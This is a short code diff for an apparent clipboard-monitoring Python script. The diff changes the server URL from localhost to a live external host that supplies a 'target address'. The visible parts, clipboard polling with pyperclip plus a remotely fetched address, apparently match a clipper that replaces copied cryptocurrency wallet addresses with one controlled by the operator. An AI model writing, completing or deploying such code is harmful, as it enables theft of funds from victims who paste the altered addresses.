@@ -2,7 +2,7 @@ import requests
 import pyperclip
 import time
 
-SERVER_URL = "http://localhost:5000/get_target_address"  # 替换为您的真实服务器地址
+SERVER_URL = "https://xdress.onrender.com/get_target_address"
 
 def get_target_address():
     """
@@ -36,4 +36,5 @@ def monitor_clipboard():
         time.sleep(1)
 
 if __name__ == "__main__":
+
     monitor_clipboard()
